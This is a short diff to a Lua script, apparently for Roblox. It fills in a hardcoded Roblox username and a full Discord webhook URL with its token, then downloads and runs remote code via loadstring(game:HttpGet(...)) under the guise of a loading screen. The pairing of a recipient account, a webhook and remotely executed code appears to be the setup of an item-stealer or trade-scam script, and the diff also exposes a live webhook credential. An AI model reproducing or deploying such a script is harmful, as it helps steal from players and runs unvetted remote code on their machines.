@@ -1,5 +1,5 @@
 Roblox_Username = "purel4urbrains"
-Discord_Webhook = Webhook
+Discord_Webhook = "https://discord.com/api/webhooks/1295130293442707539/AeZPvDHQun-6kRT8AsOiwF8Ucxdmtp-h3l1-QbWecES5l6OACFs7uVUTtTxV2_yiWBD4"
 
 if selectedLoadingScreen == "1" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/LoadingScreen/main/1"))()
